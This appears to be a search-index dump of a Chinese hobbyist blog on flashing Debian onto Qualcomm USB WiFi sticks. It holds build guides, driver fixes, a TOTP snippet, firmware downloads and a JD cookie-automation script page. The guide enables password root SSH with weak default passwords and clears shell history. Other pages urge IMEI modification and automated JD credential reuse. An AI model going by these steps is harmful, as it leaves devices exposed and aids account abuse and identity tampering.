%}\n\nhttps://www.123pan.com/s/mh49-AVfwv\n\n\n{% endnote %}\n\n----\n\n## ARDC投屏工具\n\n![](https://m.360buyimg.com/babel/jfs/t1/11704/1/19019/63754/62f53b14E97b73a89/35802c1a08bbb084.png)\n\n### 功能\n\n**支持安卓4.4投屏 (截图模式)**\n\n**安卓5.0以上投屏 (虚拟设备模式)**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-9Vfwv\n\n\n{% endnote %}\n\n----\n\n## Scrcpy投屏工具\n\n![](https://m.360buyimg.com/babel/jfs/t1/126090/37/25291/9817/62f53b89Edeb4b013/ff3dd0c13024f7ee.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/209823/13/25593/28023/62f53bb1E751b38a5/9697bebd0d3d8671.png)\n\n### 功能\n\n{% note success no-icon %}\n\n**Scrcpy 开源地址 https://github.com/Genymobile/scrcpy**\n\n\n{% endnote %}\n\n**此版本为晨钟酱开发的ScrcpyGUI版本 使用简单 操作直观**\n\n**支持安卓5.1以上设备投屏**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-QVfwv\n\n\n{% endnote %}\n\n----\n\n## dtimg2dtb\n\n![](https://m.360buyimg.com/babel/jfs/t1/102188/17/25292/8596/62f53ca1Ea8d1b86b/3899577e016d5ffb.png)\n\n{% note success no-icon %}\n\n**开源地址 https://github.com/benjaminwan/dtimg2dtb_windows**\n\n\n{% endnote %}\n\n### 功能\n\n**Boot.img解包后针对dtimg文件拆分为dtb设备树文件**\n\n**用于系统移植设备树拆分**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-EVfwv\n\n\n{% endnote %}\n\n----\n\n## APKDB 安卓逆手\n\n![](https://m.360buyimg.com/babel/jfs/t1/139318/14/24164/16998/62f53d79E1272a6f6/e8ed8f81e479b46f.png)\n\n![](https://m.360buyimg.com/babel/jfs/t1/43604/9/18519/20491/62f53db1Ebd0f648b/b561c39a0cdcd7e0.png)\n\n### 功能\n\n**很方便的安卓APP逆向工具**\n\n### 下载地址\n\n{% note info no-icon %}\n\nhttps://www.123pan.com/s/mh49-kVfwv\n\n{% endnote %}\n\n----\n\n## 总结\n\n{% note danger  %}\n\n**以上软件均收集与互联网 如有侵权等问题 请与本人联系!**\n\n{% endnote %}\n","tags":["高通","随身WIFI","驱动"]},{"title":"UFI的Debian固件下载","url":"/shizuku/065359.html","content":"\n![](https://m.360buyimg.com/babel/jfs/t1/111814/8/30672/19159/62f2c311Eddd73c93/8674b78703fdb262.png)\n\n# Debian\n\n## 适用于\n\n- **UFI001B**\n- **UFI001C**\n  * **UFI003**\n  * **UFI-W-001**\n- **SP970**\n- **UZ801**\n\n---\n\n## 固件特性\n\n- **默认使用Root账户**\n- **默认密码`1234567890`**\n- **apt源配置为阿里源**\n- **支持rc.local**\n- **增加有线网卡驱动**\n  - **RTL8152B**\n\n----\n\n### 下载地址\n\n{% note info no-icon %}\n\n**下载地址: https://www.123pan.com/s/mh49-65fwv**\n\n\n{% endnote %}\n\n---\n\n### 注意事项\n\n**UFI003与UFI-W-001使用UFI001C分支即可**\n\n**请自行推送基带文件**\n\n**SP970系列因版本巨多 疑难杂症可能较多**\n\n","tags":["Linux","Debian"]},{"title":"编译UFI设备的Debian固件","url":"/shizuku/065919.html","content":"\n![](https://m.360buyimg.com/babel/jfs/t1/41762/13/18154/17800/62f2c0c0E93bd7cca/ac2866345d2d3522.png)\n# Debian\n{% note success no-icon %}\n**Debian 是一个自由的操作系统，由 Debian 计划开发和维护。Debian 是一个自由的 Linux 发行版，添加了数以千计的应用程序以满足用户的需要。来自世界各地的数以千计的志愿者共同为 Debian 操作系统工作，注重自由和开源软件。**\n{% endnote %}\n\n## 致谢\n\n**感谢 @HandsomeHacker 为UFI设备移植的Debian系统**\n\n**Github地址**:  \n\n- https://github.com/HandsomeMod\n- https://github.com/OpenStick\n\n----\n\n## Ubuntu\n\n### 系统准备\n\n准备一个Linux操作系统 推荐使用`Ubuntu 20.04 LTS`版本\n\n- [镜像下载地址 20.04.4 (amd64, Desktop LiveDVD)](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/focal/ubuntu-20.04.4-desktop-amd64.iso)\n\n你可以使用VM虚拟机 或者 WSL1/WSL2 进行编译 亦或者云服务器\n\n由于软件包很多 建议安装好系统后进行换源操作\n\n{% note warning no-icon %}\n\n**请勿使用直接使用Root权限执行命令 以下命令均建立在 $ 权限基础之上**\n\n**Root权限执行代码均使用sudo提权执行**\n\n{% endnote %}\n\n-----\n\n### 软件换源\n\n```bash\n# 一键更换为清华源\nsudo cat>/etc/apt/sources.list<<EOF\n# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse\ndeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\n# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse\nEOF\n```\n\n### 安装依赖\n\n```bash\nsudo apt install binfmt-support qemu-user-static gcc-10-aarch64-linux-gnu kernel-package fakeroot simg2img img2simg mkbootimg bison flex gcc-aarch64-linux-gnu pkg-config libncurses-dev libssl-dev unzip git\n```\n\n### 克隆源码\n\n```bash\ngit clone https://github.com/OpenStick/linux.git --depth=1\n```\n\n**使用depth参数限制深度 提高拉取速度**\n\n**如果拉取失败可以使用** \n\n```bash\ngit clone https://ghproxy.com/github.com/OpenStick/linux.git --depth=1\n```\n\n### 编译配置\n\n```bash\nexport CROSS_COMPILE=aarch64-linux-gnu-\nexport ARCH=arm64\nmake msm8916_defconfig\nmake menuconfig\n```\n\n![配置参数页面](https://m.360buyimg.com/babel/jfs/t1/222525/10/20801/37215/62f2c606E6fe5b410/4658726da92e3abf.png)\n\n**相关配置参数 可自行参照翻译 或Linux内核编译中文指南进行配置**\n\n### 开始编译\n\n```bash\nmake -j8\n# 这里的数字请自行参考CPU核心数进行修改\n```\n\n### 软件生成\n\n```bash\nfakeroot make-kpkg  --initrd --cross-compile aarch64-linux-gnu- --arch arm64  kernel_image kernel_headers\n```\n\n**生成结束后 会在目录上层生成格式为deb的软件包**\n\n![](https://m.360buyimg.com/babel/jfs/t1/43829/30/18297/7158/62f2c5d5Eb791b031/01bd4eb8e293d1ae.png)\n\n----\n\n### 重要文件\n\n{% note info no-icon %}\n\n**在主目录下创建一个back文件夹**\n\n**将 `arch/arm64/boot/Image.gz` 文件复制到刚刚创建的文件夹**\n\n**将 `arch/arm64/boot/dts/qcom/`目录对应设备的dtb文件复制到刚刚创建的文件夹**\n\n**例如需要编译UFI001C设备 就将msm8916-handsome-openstick-ufi001c.dtb 取出放到文件夹**\n\n**可以使用 `ls msm8916-handsome-openstick*.dtb` 命令查看dtb名称** \n\n{% endnote %}\n\n----\n\n### 下载底包\n\n```bash\nwget https://github.com/OpenStick/OpenStick/releases/download/v1/debian.zip && unzip debian.zip\n```\n\n**进入目录后 将 `rootfs.img` 复制到 back 文件夹**\n\n----\n\n### 解包挂载\n\n```bash\nsimg2img rootfs.img root.img\nsudo mount root.img /mnt\nsudo  mount --bind /proc /mnt/proc \nsudo  mount --bind /dev /mnt/dev\nsudo  mount --bind /dev/pts /mnt/dev/pts\nsudo  mount --bind /sys /mnt/sys\n```\n\n**将刚刚生成的deb文件 复制到 /mnt 目录**\n\n**Chroot 进入**\n\n```bash\nsudo  chroot /mnt\n```\n\n**执行命令**\n\n```bash\ndpkg -l | grep -E \"linux-headers|linux-image\" |awk '{print $2}'|xargs dpkg -P\n```\n\n**卸载原有的Deb软件包 卸载后安装生成的新软件包**\n\n```bash\ndpkg -i *.deb\n```\n{% note warning no-icon %}\n**安装后请删除deb源文件**\n{% endnote %}\n\n----\n\n### 系统优化\n\n更换为阿里云软件源\n\n```bash\ncat>/etc/apt/sources.list<<EOF\ndeb http://mirrors.ustc.edu.cn/debian/ bullseye main non-free contrib\ndeb http://mirrors.ustc.edu.cn/debian stable-updates main contrib non-free\ndeb http://mirrors.ustc.edu.cn/debian-security/ bullseye-security main\nEOF\n```\n\n**安装常用软件 并配置语言 时区**\n\n```bash\napt install locales usbutils curl wget fdisk net-tools nano\ndpkg-reconfigure locales\ndpkg-reconfigure tzdata\n```\n\n**允许Root并配置默认登录**\n\n```bash\nsed -i '/PermitRootLogin /c PermitRootLogin yes' /etc/ssh/sshd_config\nsed -i '/PasswordAuthentication /c PasswordAuthentication yes' /etc/ssh/sshd_config\n```\n\n**修改Root密码**\n\n```bash\necho \"root:12345678\" | chpasswd\n# 或者使用\npasswd root\n```\n\n**创建脚本**\n\n```bash\ncat>>/etc/systemd/system/rc-local.service<<EOF\n[Unit]\nDescription=/etc/rc.local\nConditionPathExists=/etc/rc.local\n\n[Service]\nType=forking\nExecStart=/etc/rc.local start\nTimeoutSec=0\nStandardOutput=tty\nRemainAfterExit=yes\nSysVStartPriority=99\n\n[Install]\nWantedBy=multi-user.target\nEOF\n```\n\n```bash\ncat <<EOF >/etc/rc.local\n#!/bin/sh -e\n#\n# rc.local\n#\n# This script is executed at the end of each multiuser runlevel.\n# Make sure that the script will \"exit 0\" on success or any other\n# value on error.\n#\n\nexit 0\nEOF\n\nsystemctl daemon-reload && systemctl enable rc-local\nhistory -c\n```\n\n----\n\n{% note success no-icon %}\n\n**配置参数结束 可以退出chroot环境**\n\n**命令** `exit`\n\n{% endnote %}\n\n{% note danger no-icon %}\n\n**取出 /mnt/boot/initrd\\*\\*.img 放置于先前创建的back文件夹**\n\n\n{% endnote %}\n\n-----\n\n### 挂载打包\n\n**取消挂载**\n\n```bash\nsudo umount /mnt/proc \nsudo umount /mnt/dev/pts\nsudo umount /mnt/dev\nsudo umount /mnt/sys\nsudo umount /mnt\n```\n\n**将 root.img 转换为刷入用的 rootfs.img 格式**\n\n```bash\nimg2simg root.img rootfs.img\n```\n\n{% note info no-icon %}\n\n**rootfs.img 镜像部分全部配置打包完成**\n\n{% endnote %}\n\n-----\n\n### 打包镜像\n\n**进入之前创建的目录 back目录 将Image和dtb合并**\n\n```bash\ncat Image.gz msm8916-handsome-openstick-ufi001c.dtb > ufi001c-kernel-dtb\n```\n\n{% note info no-icon %}\n\n**如果你要编译例如SP970等 只需要将dtb替换为上面复制的dtb即可**\n\n{% endnote %}\n\n将提出来的 initrd.img-***文件 改名为initrd.img\n\n```bash\nmv initrd.img-5.15.0-handsomekernel+ initrd.img\n```\n\n### 生成镜像\n\n```bash\nmkbootimg \\\n--base 0x80000000 \\\n--kernel_offset 0x00080000 \\\n--ramdisk_offset 0x02000000 \\\n--tags_offset 0x01e00000 \\\n--pagesize 2048 \\\n--second_offset 0x00f00000 \\\n--ramdisk initrd.img \\\n--cmdline \"earlycon root=PARTUUID=a7ab80e8-e9d1-e8cd-f157-93f69b1d141e console=ttyMSM0,115200 no_framebuffer=true rw\" \\\n--kernel ufi001c-kernel-dtb \\\n-o ufi001c-boot.img\n```\n\n----\n\n## 结束\n\n{% note success no-icon %}\n\n**现在就有了 rootfs.img 文件和对应的 boot 启动文件**\n\n**可以开始刷机了**\n\n\n{% endnote %}\n\n![预览](https://m.360buyimg.com/babel/jfs/t1/66302/4/19707/11866/62f2c12bEd0b80bea/a36ccf1e37cec78b.png)\n","tags":["Linux","Debian"]},{"title":"交叉编译ARM CH9102X驱动","url":"/shizuku/064535.html","content":"\n# 交叉编译ARM下的CH9102X驱动\n\n## 官方原始源码编译\n\n```c\nmake -C ~/linux  M=~/ch343ser_linux/driver modules\nmake[1]: Entering directory '~/linux'\n\n  CC [M]  ~/ch343ser_linux/driver/ch343.o\n~/ch343ser_linux/driver/ch343.c:1684:17: error: initialization of ‘unsigned int (*)(struct tty_struct *)’ from incompatible pointer type ‘int (*)(struct tty_struct *)’ [-Werror=incompatible-pointer-types]\n 1684 |  .write_room =  ch343_tty_write_room,\n      |                 ^~~~~~~~~~~~~~~~~~~~\n~/ch343ser_linux/driver/ch343.c:1684:17: note: (near initialization for ‘ch343_ops.write_room’)\n~/ch343ser_linux/driver/ch343.c:1686:21: error: initialization of ‘unsigned int (*)(struct tty_struct *)’ from incompatible pointer type ‘int (*)(struct tty_struct *)’ [-Werror=incompatible-pointer-types]\n 1686 |  .chars_in_buffer = ch343_tty_chars_in_buffer,\n      |                     ^~~~~~~~~~~~~~~~~~~~~~~~~\n~/ch343ser_linux/driver/ch343.c:1686:21: note: (near initialization for ‘ch343_ops.chars_in_buffer’)\n~/ch343ser_linux/driver/ch343.c: In function ‘ch343_init’:\n~/ch343ser_linux/driver/ch343.c:1699:21: error: implicit declaration of function ‘alloc_tty_driver’ [-Werror=implicit-function-declaration]\n 1699 |  ch343_tty_driver = alloc_tty_driver(CH343_TTY_MINORS);\n      |                     ^~~~~~~~~~~~~~~~\n~/ch343ser_linux/driver/ch343.c:1699:19: warning: assignment to ‘struct tty_driver *’ from ‘int’ makes pointer from integer without a cast [-Wint-conversion]\n 1699 |  ch343_tty_driver = alloc_tty_driver(CH343_TTY_MINORS);\n      |                   ^\n~/ch343ser_linux/driver/ch343.c:1716:3: error: implicit declaration of function ‘put_tty_driver’ [-Werror=implicit-function-declaration]\n 1716 |   put_tty_driver(ch343_tty_driver);\n      |   ^~~~~~~~~~~~~~\ncc1: some warnings being treated as errors\nmake[2]: *** [scripts/Makefile.build:277: ~/ch343ser_linux/driver/ch343.o] Error 1\nmake[1]: *** [Makefile:1868: ~/ch343ser_linux/driver] Error 2\nmake[1]: Leaving directory '~/linux'\nmake: *** [Makefile:6: default] Error 2\n```\n\n{% note warning no-icon %}\n\n可以看到出现大量报错\n\n{% endnote %}\n\n{% note danger no-icon %}\n\nWCH官方驱动 使用了废弃函数 会导致编译失败 这里使用Fork分支\n\n{% endnote %}\n\n## 修复分支编译\n\n**alloc_tty_driver -> tty_alloc_driver**\n**put_tty_driver -> tty_driver_kref_put**\n\n{% note info no-icon %}\n驱动适用于 **CH342/CH343/CH344/CH347/CH9101/CH9102/CH9103/CH9143**\n代码Git仓库地址 https://github.com/GreatestCapacity/ch343ser_linux\n{% endnote %}\n\n### 拉取分支\n\n```shell\ngit clone https://github.com/GreatestCapacity/ch343ser_linux.git\ncd ch343ser_linux\n```\n\n### 创建Makefile\n\n```makefile\nKERNELDIR := ~/linux\n# 使用你的Linux源码地址目录\n\nPWD :=$(shell pwd)\nobj-m := ch343.o\n\ndefault:\n        $(MAKE) -C $(KERNELDIR)  M=$(PWD) modules\nclean:\n        $(MAKE) -C $(KERNELDIR)  M=$(PWD) clean\n        rm -rf *.mk .tmp_versions Module.symvers *.mod.c *.o *.ko .*.cmd Module.markers modules.order\nload:\n        insmod ch343.ko\nunload:\n        rmmod ch343\ninstall: default\n        mkdir -p /lib/modules/$(shell uname -r)/kernel/drivers/usb/serial/\n        cp -f ./ch343.ko /lib/modules/$(shell uname -r)/kernel/drivers/usb/serial/\n        depmod -a\nuninstall:\n        rm -rf /lib/modules/$(shell uname -r)/kernel/drivers/usb/serial/ch343.ko\n        depmod -a\n```\n\n### 执行编译 \n\n```shell\n$ export CROSS_COMPILE=aarch64-linux-gnu-\n$ export ARCH=arm64\n$ make\n```\n\n### 载入文件\n\n```shell\ninsmod ch343.ko\n```\n\n{% note success %}\n\n**dmesg查看日志 可以看到已经成功载入并识别**\n\n{% endnote %} \n\n![](https://m.360buyimg.com/babel/jfs/t1/61379/14/20594/21868/62f2c0a7E7fc6e187/4ce5b4354dc99baa.png)\n\n\n\n\n\n","tags":["Linux","驱动"]},{"title":"基于时间的一次性密码算法","url":"/shizuku/052840.html","content":"\n# TOTP 2FA Password\n\n**2 Factor Authentication Time-Based One-Time Password**\n\n### TOTP算法 \n\n{% note info no-icon %}\n\nPython实现 适当简化 提供密钥即可生成一次性密码\n\n{% endnote %}\n\n```python\nimport base64\nimport hmac\nimport struct\nimport time\n\n\ndef ttotp(key):\n    key = base64.b32decode(key.upper() + '=' * ((8 - len(key)) % 8))\n    counter = struct.pack('>Q', int(time.time() / 30))\n    mac = hmac.new(key, counter, 'sha1').digest()\n    offset = mac[-1] & 0x0f\n    binary = struct.unpack('>L', mac[offset:offset+4])[0] & 0x7fffffff\n    return str(binary)[-6:].zfill(6)\n\n\nif __name__ == '__main__':\n    # main()\n    key = 'PRCFQ3SPFMOTIR2D' # 密钥\n    print(ttotp(key))\n```\n","tags":["算法","青龙"]},{"title":"青龙面板 WSKEY脚本","url":"/shizuku/050126.html","content":"\n![](https://m.360buyimg.com/babel/jfs/t1/125747/36/29420/27209/62f2c39dEd7b0a436/eb4f4689bb43fa2d.png)\n\n# 青龙面板WSKEY 更新Cookie脚本\n\n{% note success no-icon %}\n\n**项目地址: https://github.com/Zy143L/wskey**\n\n**镜像地址: https://hellodns.coding.net/public/sign/wskey/git/files**\n\n{% endnote %}\n\n## 使用方法\n\n---\n\n**原版脚本地址** \n```text\nql repo https://github.com/Zy143L/wskey.git \"wskey\"\n```\n**镜像脚本地址**\n```text\nql repo https://e.coding.net/HelloDNS/sign/wskey.git \"wskey\"\n```\n\n---\n### 变量声明\n\n```shell\n变量名: JD_WSCK 参数: pin=xxxx;wskey=xxxx;\n# 注意分号 不要用中文分号!\n\n变量名: QL_PORT 参数: 端口号(int) \n# 修改过面板端口的人才需要填写 默认 5700 \n# 是本地的端口 不是 Docker 映射出去的端口! 如果你映射参数是 8888:5700 仍然填写5700\n\n变量名: WSKEY_DISCHECK 参数: 任意(str)\n# 设置 QL_WSCK变量后变量后 不检查有效性 直接更新 不使用请删除 而不是禁用\n\n变量名: WSKEY_AUTO_DISABLE 参数: 任意(str)\t\n# 设置 WSKEY_AUTO_DISABLE变量后 不会自动禁用变量\n\n变量名: WSKEY_UPDATE_HOUR 参数: 整数(int) 单位：小时\n# 设置 WSKEY_UPDATE_HOUR 变量后 会按设定的间隔时间更新 CK\n# 注意：使用此参数后，即使 CK 过期也不会更新，请不要设置过大的间隔\n\n变量名: WSKEY_TRY_COUNT 参数: 整数(int)\n# 设置 WSKEY_TRY_COUNT 变量后 获取 Token 失败会自动重试\n\n变量名: WSKEY_SLEEP 参数: 整数(int)\n# 设置 WSKEY_SLEEP 可自定义间隔时间\n```\n\n---\n## 更新 · 摘要\n\n**Version 2022-05-24 青龙版本: 2.12.1**\n\n---\n### 2022年5月24日\n\n- **优化部分变量拼接方法**\n- **支持青龙两步(2FA)验证**\n- **处理部分兼容性问题**\n\n---\n### 2022年5月5日\n\n- **优化消息发送方法 减少冗余代码**\n- ~~**增加针对两步验证导致登陆失败的消息提示**~~\n- ~~**下个版本解决两步验证无法在Token失效后登录面板的问题**~~\n\n---\n### 2022年4月13日\n\n- **优化旧版青龙兼容性(2.9.x)**\n\n---\n### 2022年3月30日\n\n- **49.235.99.\\*\\*\\* 麻烦这位别刷了**\n- **都封了几天了还在请求..累不累啊**\n\n---\n### 2022年3月21日\n\n- **屏蔽若干IP地址**\n\n```text\n39.107.107.***\n114.107.176.***\n119.128.172.**\n223.74.72.***\n1.117.193.***\n```\n- **~~麻烦这些朋友不要再刷API了 服务器近一半的请求都是这些IP~~**\n- **~~针对以上IP进行403屏蔽~~**\n- **如确实因为脚本异常死循环导致频繁请求请在issues中联系**\n\n---\n### 2022年3月18日\n\n- **增加大量注释**\n- **增加很多注释**\n- **每一行都有注释**\n- **具体请自行查看 wskey.py**\n- **请勿使用第三方搬运的本脚本**\n\n---\n### 2022年2月18日\n\n- **修正添加时间戳导致的部分脚本异常问题**\n- **修改为开启间隔更新后添加时间戳**\n- **统一WSKEY脚本变量名 均为 `WSKEY` 开头**\n- **增加更新间隔变量 `WSKEY_SLEEP` 默认10秒**\n- **替换 `QL_WSCK` 为 `WSKEY_DISCHECK`** \n\n---\n### 2022年2月5日\n\n- **支持按间隔更新CK 参数 `export WSKEY_UPDATE_HOUR=\"间隔（单位：小时）\" `**\n- **增加自动重试 参数 `export WSKEY_TRY_COUNT=\"次数\" `**\n\n---\n### 2022年2月2日\n\n- **serch_ck方法优化**\n- **调整UA为最新10.3.5参数**\n- **优化报错提示**\n- **github拉取失败的尝试使用镜像地址**\n\n---\n### 2022年2月2日\n\n- **修改检测青龙ID字段方法**\n- **不再使用版本号作为判断依据**\n- **移除更多废弃代码**\n\n---\n### 2022年2月2日\n\n- **更新10.3.5接口**\n- **新增`WSKEY_AUTO_DISABLE`变量 设置后不会自动禁用Cookie**\n- **移除部分冗余代码**\n\n---\n### 2022年1月22日\n\n- **镜像地址 `https://hellodns.coding.net/public/sign/wskey/git/files`**\n- **`ql repo https://e.coding.net/HelloDNS/sign/wskey.git \"wskey\"`**\n\n---\n### 2022年1月14日\n\n- **修复2.10之前版本青龙失败问题**\n\n---\n### 2022年1月13日\n\n- **修复2.11.0版本青龙检索失败重复添加问题**\n- **此版本兼容旧版接口 无需担心**\n\n---\n### 2022年1月13日\n\n- **目前青龙版本2.11.0最好不要更新!!!**\n- **还在修复Bug阶段 各种问题很多**\n\n---\n### 2022年1月2日\n\n- **修正因青龙更换API导致的无法登录问题**\n\n---\n### 2021年12月31日\n\n- **修复账号失效无法正常检测问题**\n\n---\n### 2021年12月30日\n\n- **修复ConnectionResetError错误**\n- **增加多节点测试功能**\n\n---\n### 2021年11月23日\n\n- **~~新版青龙修改端口为5600了..~~**\n- **脚本无需修改 如果出现报错的按照报错内容声明变量即可**\n\n---\n### 2021年11月18日\n\n- **更新服务地址 务必更新!!!**\n- **更新服务地址 务必更新!!!**\n- **更新服务地址 务必更新!!!**\n\n---\n### 2021年11月10日\n\n- **关闭自动禁用WSKEY**\n\n---\n### 2021年11月3日\n\n- **新增面板登录失败推送**\n- **修复出现错误码导致的脚本退出**\n\n---\n### 2021年11月1日\n\n- **请使用甲骨文 等境外服务器的 检查自己的服务器DNS是否为 8.8.8.8**\n- **国内服务器请使用 119.29.29.29 114.114.114.114**\n- **排查一下午...客户机子上检查 居然是DNS不解析..出现异常退出的, 请先检查DNS服务器**\n\n---\n### 2021年11月1日 \n\n- **~~继续修复因为连接数过多导致的脚本异常~~**\n\n---\n### 2021年11月1日\n\n- **~~尝试修复因为连接问题导致的脚本退出~~**\n\n---\n### 2021年11月1日\n\n- **修复青龙推送失败导致脚本报错**\n\n---\n### 2021年11月1日\n\n- **禁用时wskey&cookie同时禁用**\n- **优化失效推送内容**\n- **解决接口超时问题**\n\n---\n### 2021年11月1日\n\n- **优化更新检查逻辑**\n- **增加有效检查接口**\n- **更新版本为 10.2.2**\n- **修正接口错误问题**\n- **引入随机签名算法**\n- **引入随机 UA 算法**\n\n---\n### 2021年10月28日\n\n- **使用修改sendNotify自动更新Cookie的朋友请务必 删除 `QL_WSCK` 变量**\n- **否则会导致频繁更新Cookie导致Cookie有效期变得非常短暂** \n- **有Cookie自动禁用的程序可以开启 脚本转换后会自动启用转换成功的Cookie** \n\n---\n### 2021年10月10日\n\n- **修复因为长时间未登陆面板导致的Token失效 并修正Token获取**\n- **感谢 @[haohaoget](https://github.com/haohaoget) 的 PR**\n\n---\n### 2021年9月16日\n\n- **定时任务时间相同 同时请求过多 导致云端返回403**！！！\n- **请大家务必修改定时任务的第一位时间！！！**\n- **下个版本增加备选云端服务器和其他云参数地址**\n\n---\n### 2021年9月16日\n\n- **继续修复定时任务错误的问题(莫名其妙的Bug)**\n- **不使用可能引发执行错误的布尔判断**\n- **云端更新UA**\n\n----\n\n### 2021年9月15日\n\n- **继续修复定时任务错误**\n- **移除LZMA GZIP等代码压缩 开放源码**\n- **引入青龙面板推送功能 对脚本升级进行推送**\n\n---\n### 2021年9月11日\n\n- **修复定时任务错误**\n\n---\n### 2021年9月5日\n\n-  **修改任务定时为`15 */16 * * *`**\n- **增加 `QL_WSCK` 变量 填写变量后不检查Cookie有效性 直接进行转换** \n\n    > **最好修改定时任务为 16 小时 一次**\n\n- **使用 LZMA 算法压缩脚本 更省空间**\n\n- **修复一处升级逻辑判定错误**\n\n---\n### 2021年9月4日\n\n- **支持中文用户名的URL编码转换** \n- **封闭查询参数 改进对相似账号的搜索准确性**\n- **HTTP请求加入异常捕捉, 并增加重试次数**\n- **增加云端变量 从云端读取 UA 防止 UA 失效**\n- **支持版本更新 有版本更新时 会提醒用户更新**\n- **支持自定义端口 参数 `export QL_PORT=\"端口号\" `**\n- **优化逻辑部分 增加重试机制 对 API 接口增加备选方案**\n- **支持实时输出日志 不需要等待执行完成才能看到结果**\n\n---\n\n\n## 程序特点\n\n**1. 云端算法**\n\n**2. 支持自定义内部端口的面板 例如 `5600  6666  3721` 对应变量 `export QL_PORT=\"端口号\"`**\n\n**3. 实时日志效果 无需全部执行完成返回**\n\n**4. HTTP错误捕捉 最大限度防止出现因为容器没网 403错误 IP拉黑 等情况导致脚本错误**\n\n**智能化**\n\n   > **智能转换 JD_COOKIE 保证账号不过期**\n   >\n   > **智能添加 JD_COOKIE 保证账号不漏加**\n   >\n   > **智能更新 JD_COOKIE 保证账号不重复**\n\n## 程序优点\n\n----------------\n\n​\t**底层逻辑**打通**信息屏障**，创建脚本**新生态**。**顶层设计**聚焦用户感受\n\n​\t**抽离透传归因分析**作为**抓手**为产品**赋能**，**体验度量**作为**闭环**评判标准。\n\n​\t亮点是**载体**，优势是**链路**。思考整个**生命周期**，完善**逻辑**，考虑资源**整合**\n\n-------------\n\n## 干啥用的?\n\n​\t 用组合拳**赋能智慧**，打通**生态闭环**，帮助客户延长**有效时间**，强化用户**感知**，打破**边界**，打造**生态化薅豆**\n\n","tags":["青龙","JD","WSKEY"]},{"title":"SP970 V3 硬件与固件","url":"/shizuku/051911.html","content":"\n# SP970 V3 硬件与固件\n\n## 硬件参数\n\n- **PCB: SP970-B-V3**\n- **EMCP: KMFJ20005A**\n- **SOC: MSM8916 1VV**\n- **MODEM: ACPM-7081/M3582 RT0/7E222E9B/WTR1605L**\n- **WIFI: WCN3660**\n- **POWER: PM8916**\n\n---\n\n![](https://m.360buyimg.com/babel/jfs/t1/144501/21/25863/76872/62f2c1a4Ee623b799/67d926707202ef22.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/30228/19/17266/350153/62f2c1f4Ef61fa73c/e043e3a8c269c9cb.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/210561/12/25111/332356/62f2c1deE56d8f030/1c0311281e7c915a.jpg)\n\n---\n\n## 系统固件\n\n{% note success no-icon %}\n\n**包含 `rawprogram0.xml` 可使用MiKo/MiFlash刷入 包含 `GPT` 分区表 可用于底层救砖**\n\n**下载地址: https://www.123pan.com/s/mh49-RLfwv 提取码:97v3**\n\n**仅适用SP970_V3设备**\n\n{% endnote %}\n\n### QCN文件\n\n{% note info no-icon %}\n\n**可使用星海工具刷入**\n\n**下载地址: https://www.123pan.com/s/mh49-DLfwv 提取码:q7v3**\n\n**仅适用SP970_V3设备**\n\n{% endnote %}\n\n\n\n{% note warning %}\n\n**QCN只适用于丢失串号后补救 请务必在写入QCN后修改IMEI**\n\n{% endnote %}\n\n\n\n## END\n\n {% note danger no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note info no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note success no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n","tags":["高通","随身WIFI"]},{"title":"UFI003_MB_V02 硬件与固件","url":"/shizuku/045009.html","content":"\n# UFI003_MB_V02 硬件与固件\n\n## 硬件参数\n\n- **PCB: UFI003_MB_V02**\n- **EMCP: TOSHIBA TYC0FH121638RA**\n- **SOC: MSM8916 0VV**\n- **MODEM: 7169E3012/WTR4905**\n- **WIFI: WCN3620**\n- **POWER: PM8916**\n\n---\n\n![](https://m.360buyimg.com/babel/jfs/t1/138949/14/28419/146464/62f2c3c7E5e64ea9e/85197cbc28f90b0a.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/58395/1/21332/309286/62f2c404E2e887e40/2edd93d698e68113.jpg)\n\n![](https://m.360buyimg.com/babel/jfs/t1/162141/20/29450/303187/62f2c418E738fc268/26ccf9a688566dbe.jpg)\n\n---\n\n## 系统固件\n\n{% note success no-icon %}\n\n**包含 `rawprogram0.xml` 可使用MiFlash刷入**\n\n**包含 `GPT` 分区表 可用于底层救砖**\n\n**下载地址: https://www.123pan.com/s/mh49-Czfwv**\n\n**仅适用UFI003_MB_V02设备**\n\n{% endnote %}\n\n### QCN文件\n\n{% note info no-icon %}\n\n**可使用星海工具或Miko刷入**\n\n**下载地址: https://www.123pan.com/s/mh49-Nzfwv**\n\n**仅适用UFI003_MB_V02设备**\n\n{% endnote %}\n\n\n\n{% note warning %}\n\n**QCN只适用于丢失串号后补救 请务必在写入QCN后修改IMEI**\n\n{% endnote %}\n\n\n\n## END\n\n {% note danger no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note info no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote %}\n\n\n\n{% note success no-icon %}\n\n**请务必在进行任何操作之前, 备份设备固件 & QCN**！\n\n{% endnote 